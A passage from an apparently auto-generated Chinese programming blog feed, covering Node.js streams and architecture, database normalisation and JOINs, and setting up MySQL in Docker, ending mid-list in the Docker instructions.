        <content type="html"><![CDATA[<h2 id="stream-释义"><a href="#stream-释义" class="headerlink" title="stream 释义"></a>stream 释义</h2><ul><li>stream 是水流，但默认没有水</li><li>stream.write 可以让水流中有水（数据）</li><li>每次写的小数据叫做 chunk （块）</li><li>产生数据的一段叫做 source （源头）</li><li>得到数据的一段叫做 sink （水池）</li></ul><p><img src="/Blog/2020/06/29/node_js/Stream-%E6%B5%81/index/img.png"></p><h5 id="实用栗子："><a href="#实用栗子：" class="headerlink" title="实用栗子："></a><a href="https://github.com/zch233/stream-demo1">实用栗子</a>：</h5><p>用 stream 和不用 stream 传输大文件时，node 占用内存区别很大<br>用 stream 时，读一个 150m 的文件，基本不会高于 30m<br>但是不用 stream，内存占用 100m+，<strong>要知道分配给nodeJs的内存有限</strong>，所以用 stream 就可以一点一点慢慢传</p><h2 id="管道-释义"><a href="#管道-释义" class="headerlink" title="管道 释义"></a>管道 释义</h2><ul><li>两个流可以用一个管道相连</li><li>stream1 的末尾连接上 stream2 的开端</li><li>只要 stream1 有数据，就会流到 stream2</li></ul><h3 id="pipe-也可以通过事件实现"><a href="#pipe-也可以通过事件实现" class="headerlink" title="pipe 也可以通过事件实现"></a>pipe 也可以通过事件实现</h3><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stream1 有数据就塞给 stream2</span></span><br><span class="line">stream1.<span class="keyword">on</span>(<span class="string">&#x27;data&#x27;</span>, chunk =&gt; &#123;</span><br><span class="line">  stream2.write(chunk)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// stream1 停了，就停掉 stream2</span></span><br><span class="line">stream1.<span class="keyword">on</span>(<span class="string">&#x27;end&#x27;</span>, () =&gt; &#123;</span><br><span class="line">  stream2.end()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="Stream-对象的原型链"><a href="#Stream-对象的原型链" class="headerlink" title="Stream 对象的原型链"></a>Stream 对象的原型链</h2><p><a href="">栗子</a></p><ul><li>自身属性（由fs.Readable.prototype 构造）</li><li>原型：stream.Readable.peototype</li><li>二级原型： stream.Stream.prototype</li><li>三级原型：events.EventEmitter.prototype</li><li>四级原型：Object.prototype</li><li><strong>Stream 对象都继承了 EventEmitter</strong></li></ul><h3 id="支持的事件和方法"><a href="#支持的事件和方法" class="headerlink" title="支持的事件和方法"></a>支持的事件和方法</h3><p><img src="/Blog/2020/06/29/node_js/Stream-%E6%B5%81/index/img_1.png"></p><h2 id="Stream-分类"><a href="#Stream-分类" class="headerlink" title="Stream 分类"></a>Stream 分类</h2><ul><li>Readable 可读</li><li>Writeable 可写</li><li>Duplex 可读可写（双向）（读写一般不交叉）</li><li>Transform 可读可写（变化）（自己写，自己读，webpack常用，比如把 scss 转换成 css，es6 编译成 es5）</li></ul><h4 id="手动实现一个-Readable-的流"><a href="#手动实现一个-Readable-的流" class="headerlink" title="手动实现一个 Readable 的流"></a>手动实现一个 Readable 的流</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">const &#123; Readable &#125; = require(<span class="string">&#x27;stream&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 先推再读</span><br><span class="line"><span class="regexp">//</span> const inStream = new Readable()</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> inStream.push(<span class="string">&#x27;zch&#x27;</span>)</span><br><span class="line"><span class="regexp">//</span> inStream.push(<span class="string">&#x27;233333333333333333&#x27;</span>)</span><br><span class="line"><span class="regexp">//</span> inStream.push(null) <span class="regexp">//</span> no more data</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> <span class="regexp">//</span> inStream.pipe(process.stdout)</span><br><span class="line"><span class="regexp">//</span> <span class="regexp">//</span> 等价于</span><br><span class="line"><span class="regexp">//</span> inStream.on(<span class="string">&#x27;data&#x27;</span>, chunk =&gt; &#123;</span><br><span class="line"><span class="regexp">//</span>   console.log(<span class="string">&#x27;push&#x27;</span>)</span><br><span class="line"><span class="regexp">//</span>   console.log(chunk.toString())</span><br><span class="line"><span class="regexp">//</span> &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 等读了再推</span><br><span class="line">const inStream = new Readable(&#123;</span><br><span class="line">  read(size) &#123;</span><br><span class="line">    const char = String.fromCharCode(this.charCode++)</span><br><span class="line">    console.log(<span class="string">&#x27;push\n&#x27;</span>)</span><br><span class="line">    this.push(char)</span><br><span class="line">    <span class="keyword">if</span> (this.charCode &gt; <span class="number">90</span>) &#123;</span><br><span class="line">      this.push(null)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">inStream.charCode = <span class="number">65</span></span><br><span class="line"></span><br><span class="line">inStream.pipe(process.stdout)</span><br></pre></td></tr></table></figure><h4 id="手动实现一个-writable-的流"><a href="#手动实现一个-writable-的流" class="headerlink" title="手动实现一个 writable 的流"></a>手动实现一个 writable 的流</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">const &#123; Writable &#125; = <span class="built_in">require</span>(<span class="string">&#x27;stream&#x27;</span>)</span><br><span class="line"></span><br><span class="line">const outStream = new <span class="built_in">Writable</span>(&#123;</span><br><span class="line">  <span class="built_in">write</span>(chunk, encoding, callback) &#123;</span><br><span class="line">    console<span class="selector-class">.log</span>(chunk<span class="selector-class">.toString</span>())</span><br><span class="line">    <span class="built_in">callback</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">process<span class="selector-class">.stdin</span><span class="selector-class">.pipe</span>(outStream)</span><br></pre></td></tr></table></figure><h4 id="手动实现一个-duplex-的流"><a href="#手动实现一个-duplex-的流" class="headerlink" title="手动实现一个 duplex 的流"></a>手动实现一个 duplex 的流</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> 只需要把 writable 和 readable 结合起来，同事实现 read 和 write 方法即可</span><br></pre></td></tr></table></figure><h4 id="手动实现一个-transform-的流"><a href="#手动实现一个-transform-的流" class="headerlink" title="手动实现一个 transform 的流"></a>手动实现一个 transform 的流</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const &#123; Transform &#125; = <span class="built_in">require</span>(<span class="string">&#x27;stream&#x27;</span>)</span><br><span class="line">const upperTransform = new <span class="built_in">Transform</span>(&#123;</span><br><span class="line">  <span class="attribute">transform</span> (chunk, encoding, callback) &#123;</span><br><span class="line">    this<span class="selector-class">.push</span>(chunk<span class="selector-class">.toString</span>()<span class="selector-class">.toUpperCase</span>())</span><br><span class="line">    <span class="built_in">callback</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">process<span class="selector-class">.stdin</span><span class="selector-class">.pipe</span>(upperTransform)<span class="selector-class">.pipe</span>(process.stdout)</span><br></pre></td></tr></table></figure><h5 id="transform-的流的栗子-实现gzip-："><a href="#transform-的流的栗子-实现gzip-：" class="headerlink" title="transform 的流的栗子(实现gzip)："></a>transform 的流的栗子(实现gzip)：</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line">const zlib = <span class="built_in">require</span>(<span class="string">&#x27;zlib&#x27;</span>)</span><br><span class="line">const file = process<span class="selector-class">.argv</span><span class="selector-attr">[2]</span></span><br><span class="line"></span><br><span class="line">fs<span class="selector-class">.createReadStream</span>(file)</span><br><span class="line">  <span class="selector-class">.pipe</span>(zlib<span class="selector-class">.createGzip</span>())</span><br><span class="line">  <span class="selector-class">.pipe</span>(fs<span class="selector-class">.createWriteStream</span>(file + <span class="string">&#x27;.gz&#x27;</span>))</span><br></pre></td></tr></table></figure><h5 id="升级（加点进度条）"><a href="#升级（加点进度条）" class="headerlink" title="升级（加点进度条）"></a>升级（加点进度条）</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line">const zlib = <span class="built_in">require</span>(<span class="string">&#x27;zlib&#x27;</span>)</span><br><span class="line">const file = process<span class="selector-class">.argv</span><span class="selector-attr">[2]</span></span><br><span class="line"></span><br><span class="line">fs<span class="selector-class">.createReadStream</span>(file)</span><br><span class="line">  <span class="selector-class">.pipe</span>(zlib<span class="selector-class">.createGzip</span>())</span><br><span class="line">  <span class="selector-class">.on</span>(<span class="string">&#x27;data&#x27;</span>, () =&gt; console<span class="selector-class">.log</span>(<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">  <span class="selector-class">.pipe</span>(fs<span class="selector-class">.createWriteStream</span>(file + <span class="string">&#x27;.gz&#x27;</span>))</span><br><span class="line">  <span class="selector-class">.on</span>(<span class="string">&#x27;finish&#x27;</span>, () =&gt; console<span class="selector-class">.log</span>(<span class="string">&#x27;Done&#x27;</span>))</span><br></pre></td></tr></table></figure><h5 id="再次升级（升级为一个-transform-方法）"><a href="#再次升级（升级为一个-transform-方法）" class="headerlink" title="再次升级（升级为一个 transform 方法）"></a>再次升级（升级为一个 transform 方法）</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">const fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line">const zlib = <span class="built_in">require</span>(<span class="string">&#x27;zlib&#x27;</span>)</span><br><span class="line">const file = process<span class="selector-class">.argv</span><span class="selector-attr">[2]</span></span><br><span class="line"></span><br><span class="line">const &#123; Transform &#125; = <span class="built_in">require</span>(<span class="string">&#x27;stream&#x27;</span>)</span><br><span class="line">const <span class="attribute">transform</span> = new <span class="built_in">Transform</span>(&#123;</span><br><span class="line">  <span class="attribute">transform</span> (chunk, encoding, callback) &#123;</span><br><span class="line">    console<span class="selector-class">.log</span>(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    <span class="built_in">callback</span>(null, chunk)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fs<span class="selector-class">.createReadStream</span>(file)</span><br><span class="line">  <span class="selector-class">.pipe</span>(zlib<span class="selector-class">.createGzip</span>())</span><br><span class="line">  <span class="selector-class">.pipe</span>(<span class="attribute">transform</span>) // 这里可以做进度条，webpack 就是这样的原理，vue-loader =&gt; scss-loader =&gt; css-loader =&gt; style-loader</span><br><span class="line">  <span class="selector-class">.pipe</span>(fs<span class="selector-class">.createWriteStream</span>(file + <span class="string">&#x27;.gz&#x27;</span>))</span><br><span class="line">  <span class="selector-class">.on</span>(<span class="string">&#x27;finish&#x27;</span>, () =&gt; console<span class="selector-class">.log</span>(<span class="string">&#x27;Done&#x27;</span>))</span><br></pre></td></tr></table></figure><h5 id="再次升级（我们还可以加密内容）"><a href="#再次升级（我们还可以加密内容）" class="headerlink" title="再次升级（我们还可以加密内容）"></a>再次升级（我们还可以加密内容）</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">const fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line">const zlib = <span class="built_in">require</span>(<span class="string">&#x27;zlib&#x27;</span>)</span><br><span class="line">const file = process<span class="selector-class">.argv</span><span class="selector-attr">[2]</span></span><br><span class="line">const crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"></span><br><span class="line">const &#123; Transform &#125; = <span class="built_in">require</span>(<span class="string">&#x27;stream&#x27;</span>)</span><br><span class="line">const <span class="attribute">transform</span> = new <span class="built_in">Transform</span>(&#123;</span><br><span class="line">  <span class="attribute">transform</span> (chunk, encoding, callback) &#123;</span><br><span class="line">    console<span class="selector-class">.log</span>(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    <span class="built_in">callback</span>(null, chunk)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fs<span class="selector-class">.createReadStream</span>(file)</span><br><span class="line">  <span class="selector-class">.pipe</span>(crypto<span class="selector-class">.createCipher</span>(<span class="string">&#x27;aes192&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>))</span><br><span class="line">  <span class="selector-class">.pipe</span>(zlib<span class="selector-class">.createGzip</span>())</span><br><span class="line">  <span class="selector-class">.pipe</span>(<span class="attribute">transform</span>) // 这里可以做进度条，webpack 就是这样的原理，vue-loader =&gt; scss-loader =&gt; css-loader =&gt; style-loader</span><br><span class="line">  <span class="selector-class">.pipe</span>(fs<span class="selector-class">.createWriteStream</span>(file + <span class="string">&#x27;.gz&#x27;</span>))</span><br><span class="line">  <span class="selector-class">.on</span>(<span class="string">&#x27;finish&#x27;</span>, () =&gt; console<span class="selector-class">.log</span>(<span class="string">&#x27;Done&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Stream-用途广泛"><a href="#Stream-用途广泛" class="headerlink" title="Stream 用途广泛"></a>Stream 用途广泛</h2><p><img src="/Blog/2020/06/29/node_js/Stream-%E6%B5%81/index/img_2.png"></p><p><a href="https://jscomplete.com/learn/node-beyond-basics/node-streams">参考</a><br><a href="https://nodejs.org/api/stream.html">文档</a><br><a href="https://juejin.im/post/5b421b5ee51d45198651159b">面试题</a></p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Node.js 技术架构</title>
      <link href="/Blog/2020/06/07/node_js/Node%C2%B7js%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/index/"/>
      <url>/Blog/2020/06/07/node_js/Node%C2%B7js%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/index/</url>
      
        <content type="html"><![CDATA[<h1 id="Node-js-是什么"><a href="#Node-js-是什么" class="headerlink" title="Node.js 是什么"></a>Node.js 是什么</h1><ul><li><p>是一个平台<br>1.他将多种技术组合在一起<br>2.让JavaScript也能调用系统接口、开发后端应用</p></li><li><p>Node.js 用到了那些技术<br>1.V8引擎<br>2.libuv<br>3.C&#x2F;C++实现的 c-ares（解析dns）、http-parser（解析http）、OpenSSL（来做https）、zlib（来做加密）等库</p></li></ul><h1 id="技术架构"><a href="#技术架构" class="headerlink" title="技术架构"></a>技术架构</h1><p><img src="/Blog/2020/06/07/node_js/Node%C2%B7js%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/index/img.png" alt="如果要看源码，推荐看0.10版本"></p><ul><li>什么是bindings<br>1.js不能直接对系统进行操作<br>2.node.js 用 C++ 进行封装，封装的文件叫做 xxx_bindings.cpp<br>3.在用node.js提供的编译工具将其编译成 .node 文件<br>4.这样js就能直接 require 这个文件，<br>5.中间的桥梁就叫做binding，因为很多桥梁，所以就叫bindings</li></ul><blockquote><p>JS 调用C++代码 <a href="http://nodejs.cn/api/addons.html#addons_function_arguments">http://nodejs.cn/api/addons.html#addons_function_arguments</a><br>C++ 调用JS 回调 <a href="http://nodejs.cn/api/addons.html#addons_callbacks">http://nodejs.cn/api/addons.html#addons_callbacks</a></p></blockquote><h1 id="Node-js-的工作流程"><a href="#Node-js-的工作流程" class="headerlink" title="Node.js 的工作流程"></a>Node.js 的工作流程</h1><p><img src="/Blog/2020/06/07/node_js/Node%C2%B7js%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/index/img_1.png"></p><h1 id="libuv-是什么"><a href="#libuv-是什么" class="headerlink" title="libuv 是什么"></a>libuv 是什么</h1><ul><li>背景<br>1.FreeBSD系统上面有kqueue<br>2.Linux系统上有epoll<br>3.windows系统上有IOCP<br>4.于是Ryan 就写了一个跨平台的异步 I&#x2F;O库–libuv<br>5.libuv会根据系统自动选择合适的方案</li><li>功能<br>可以用于 TCP&#x2F;UDP&#x2F;DNS&#x2F;文件等的异步操作</li></ul><h1 id="V8"><a href="#V8" class="headerlink" title="V8"></a>V8</h1><h2 id="功能"><a href="#功能" class="headerlink" title="- 功能"></a>- 功能</h2><ol><li>将 JS 源代码变成本地代码并执行</li><li>维护调用栈，确保 JS 函数的执行顺序</li><li>内存管理，为所有对象分配内存</li><li>垃圾回收，重复利用无用的内存</li><li>实现 JS 的标准库</li></ol><h2 id="注意"><a href="#注意" class="headerlink" title="- 注意"></a>- 注意</h2><ol><li>V8 不提供DOM API</li><li>V8 执行 JS 是单线程的</li><li>可以开启两个线程分别执行 JS</li><li>V8 本身是包含多个线程的，如垃圾回收为单独线程</li><li>自带 event loop 但 Node.js 基于 libuv自己做了一个</li></ol><h1 id="API"><a href="#API" class="headerlink" title="API"></a>API</h1><p><img src="/Blog/2020/06/07/node_js/Node%C2%B7js%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/index/img_2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据库基础知识</title>
      <link href="/Blog/2020/06/07/javascript/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/index/"/>
      <url>/Blog/2020/06/07/javascript/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/index/</url>
      
        <content type="html"><![CDATA[<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">启动 mysql</span><br><span class="line">docker container start mysql1 </span><br><span class="line">或者</span><br><span class="line">docker <span class="built_in">run</span> --name mysql1 -e <span class="attribute">MYSQL_ROOT_PASSWORD</span>=123456 -p 3306:3306 -d mysql:5.7.27</span><br><span class="line">进入 mysql</span><br><span class="line">docker exec -it mysql1 bash</span><br><span class="line">mysql -u root -p</span><br><span class="line">输入密码 123456</span><br></pre></td></tr></table></figure><h2 id="第一范式"><a href="#第一范式" class="headerlink" title="第一范式"></a>第一范式</h2><h5 id="定义"><a href="#定义" class="headerlink" title="- 定义"></a>- 定义</h5><ol><li>字段不可再分</li></ol><h5 id="举例"><a href="#举例" class="headerlink" title="- 举例"></a>- 举例</h5><ol><li>我们要储存体检者的双眼视力</li><li>那么我们应该存为左眼视力和右眼视力两个字段</li><li>即 user 表里应该有 left_eye 和 right_eye</li><li>而不能把他们存在一个字段里</li></ol><h3 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h3><p><img src="/Blog/2020/06/07/javascript/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/index/img.png"></p><p>这是一个学生选课表，没有违反第一范式，但是存在如下问题：<br>数据冗余、创建系时插入异常。删除学生会导致系消失、学生改系时改动多处</p><p><strong>结论：第一范式不够强大。</strong></p><h2 id="第二范式"><a href="#第二范式" class="headerlink" title="第二范式"></a>第二范式</h2><h5 id="定义（不标准）"><a href="#定义（不标准）" class="headerlink" title="- 定义（不标准）"></a>- 定义（不标准）</h5><ol><li>在 1NF 的基础上，要有键（键可由多个字段组合）</li><li>所有字段分别 <strong>完全依赖</strong> 于键</li><li>如果键是多个字段组合，则<strong>不允许部分依赖</strong>于该键</li></ol><h5 id="依赖关系"><a href="#依赖关系" class="headerlink" title="- 依赖关系"></a>- 依赖关系</h5><ol><li>给出键，就能唯一确定字段的值，</li><li>如果给出学号，就能唯一确定姓名，反之则不行</li><li>则称姓名依赖于学号</li></ol><h6 id="不满足第二范式的地方"><a href="#不满足第二范式的地方" class="headerlink" title="不满足第二范式的地方"></a>不满足第二范式的地方</h6><ol><li>上表的键为（学号，课名）</li><li>但存在部分依赖：姓名依赖于学号</li></ol><h6 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h6><ol><li>选课表（学号，课名，分数）</li><li>学生表（学号，姓名，系名，系主任）</li></ol><p><img src="/Blog/2020/06/07/javascript/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/index/img_1.png"></p><h2 id="第三范式"><a href="#第三范式" class="headerlink" title="第三范式"></a>第三范式</h2><h5 id="定义（不标准）-1"><a href="#定义（不标准）-1" class="headerlink" title="- 定义（不标准）"></a>- 定义（不标准）</h5><ol><li>一个表里不能有两层依赖</li><li>给出学号，就能确定系名：系名依赖学号</li><li>给出系名，就能确定系主任：系主任依赖于系名</li><li>所以，系主任间接依赖于学号</li></ol><h6 id="改进-1"><a href="#改进-1" class="headerlink" title="改进"></a>改进</h6><ol><li>把系名和系主任单独建表</li></ol><p><img src="/Blog/2020/06/07/javascript/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/index/img_2.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>第一范式<br>属性不可分割</li><li>第二范式<br>字段完全依赖于键</li><li>第三范式<br>字段没有间接依赖</li><li>BC 范式<br>键中的属性也不存在间接依赖</li></ul><h2 id="JOIN"><a href="#JOIN" class="headerlink" title="JOIN"></a>JOIN</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/29234064">连接表</a></li></ul><ol><li>inner join</li><li>left join（会保留右边的 null，以保证左边都显示）</li><li>right join（会保留左边的 null，以保证右边都显示）</li><li>full outer join（保留两边的 null，以保证两边都显示）</li></ol><p><img src="/Blog/2020/06/07/javascript/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/index/img_3.png"></p><p>语法：</p><blockquote><p>公式：SELECT A.PK,B.PK,A.Value,b.Value<br>    FROM Table_A<br>    INNER JOIN Table_B<br>    ON A.PK &#x3D; B.PK;</p><p>栗子： select usesr.name , orders.amount from users inner join orders<br>     on users.id &#x3D; orders.userId;</p></blockquote><p><img src="/Blog/2020/06/07/javascript/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/index/img_4.png" alt="三张表"></p><p><img src="/Blog/2020/06/07/javascript/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/index/img_5.png" alt="查询结果"></p><h2 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h2><h4 id="缓存字段"><a href="#缓存字段" class="headerlink" title="缓存字段"></a>缓存字段</h4><p>假设一个博客 blog 包涵多个评论，现在想知道有多少条评论<br>使用 count 太慢了<br>我们可以在 blog 表中增加字段 commemt_count<br>每次增加一条评论就给 comment_count 加1<br>每次删除一条评论就给 comment_count 减1</p><h4 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h4><p>有些操作必须一次完成<br>还是上述栗子，用户评论完我们要做两件事情<br>第一步在 comment 表中增加一条数据<br>第二部在 blog 表中给 comment_count 加1<br><strong>但是</strong> 如果第一步执行了，第二步没有执行怎么办（比如网络波动之类的一些其他事故）<br>那么数据就乱了<br>所以我们需要使用事务，两个操作一起成功，如果有一个失败，那么就不生效。</p><h4 id="MySQL-储存引擎"><a href="#MySQL-储存引擎" class="headerlink" title="MySQL 储存引擎"></a>MySQL 储存引擎</h4><p>命令：SHOW ENGINES;</p><ul><li>常见的</li></ul><ol><li>InnoDB - 默认，目前版本是新版 InnoDB</li><li>MyISAM - 拥有较高的插入、查询速度，但不支持事务</li><li>Memory - 内存中，快速访问数据</li><li>Archive - 只支持 insert 和 select</li></ol><p><strong>InnoDB 是事务型数据库的首选，支持事务、遵循 ACID、支持行锁和外键</strong></p><h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><ol><li>提高搜索效率</li><li>where xxx &gt; 100 那么我们就可以创建 xxx 的索引</li><li>where xxx &gt; 100 and yyy &gt; 200，创建xxx，yyy的索引</li></ol>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker x MySQL</title>
      <link href="/Blog/2020/06/06/javascript/Docker-MySQL/index/"/>
      <url>/Blog/2020/06/06/javascript/Docker-MySQL/index/</url>
      
        <content type="html"><![CDATA[<h2 id="windows安装"><a href="#windows安装" class="headerlink" title="windows安装"></a>windows安装</h2><h5 id="新版：Docker"><a href="#新版：Docker" class="headerlink" title="- 新版：Docker"></a>- 新版：Docker</h5><ol><li>注册 <a href="https://hub.docker.com/">https://hub.docker.com/</a></li><li>下载 Docker for Windows Installer （需要登录）</li><li>确保 docker –version 返回版本号</li><li>设置国内镜像 <a href="https://docker.mirrors.ustc.edu.cn/">https://docker.mirrors.ustc.edu.cn</a> （<a href="http://guide.daocloud.io/dcs/daocloud-9153151.html#Docker%E5%8A%A0%E9%80%9F%E5%99%A8-DockerforWindows">教程</a>）设置完后需要重启 docker</li><li>确保 docker run hello-world 输出 Hello from Docker! （第一次会自动下载某个安装包）</li><li>如果你因为 Hyper-V 等原因无法安装新版，可以考虑安装旧版 Docker （<a href="https://www.jianshu.com/p/d9d80aa9a513">遇到的错误看这篇</a>）</li></ol><h5 id="旧版：Docker"><a href="#旧版：Docker" class="headerlink" title="- 旧版：Docker"></a>- 旧版：Docker</h5><ol><li>旧版 Docker 兼容性更好，性能差一点</li><li><a href="https://github.com/docker/toolbox/releases">下载</a> Docker Toolbox</li><li>打开 Docker QuickStart，运行后看到一个IP，退出</li><li>以后会用到这个 IP，用 docker-machine ip 可得到 IP</li><li>设置国内镜像 <a href="https://docker.mirrors.ustc.edu.cn/">https://docker.mirrors.ustc.edu.cn</a> （<a href="http://guide.daocloud.io/dcs/daocloud-9153151.html#Docker%E5%8A%A0%E9%80%9F%E5%99%A8-DockerforWindows">教程</a>）设置完后需要重启 docker</li><li>确保 docker run hello-world 输出 Hello from Docker! （第一次会自动下载某个安装包）</li></ol><h2 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h2><ol><li>按照<a href="https://docs.docker.com/docker-for-mac/install/">官方教程</a>下载，.dmp 并安装即可</li><li>设置国内镜像 <a href="https://docker.mirrors.ustc.edu.cn/">https://docker.mirrors.ustc.edu.cn</a> （<a href="http://guide.daocloud.io/dcs/daocloud-9153151.html#Docker%E5%8A%A0%E9%80%9F%E5%99%A8-DockerforWindows">教程</a>）设置完后需要重启 docker</li></ol><h2 id="Docker-安装-MySQL"><a href="#Docker-安装-MySQL" class="headerlink" title="Docker 安装 MySQL"></a>Docker 安装 MySQL</h2><ol><li>进入 Docker 上面的MySQl 的<a href="https://hub.docker.com/_/mysql">主页</a></li><li>选择版本，如 5.7.27 或者 8.0.18</li><li>往下翻找到第一个可以运行的命令（docker run….）</li><li>name 是容器的名字</li><li>MYSQL_ROOT_PASSWORD 是密码</li><li>-d 是守护进程</li><li>tag 是版本号，我们选用 5.7.27</li><li>再加一个端口映射 -p 3306:3306 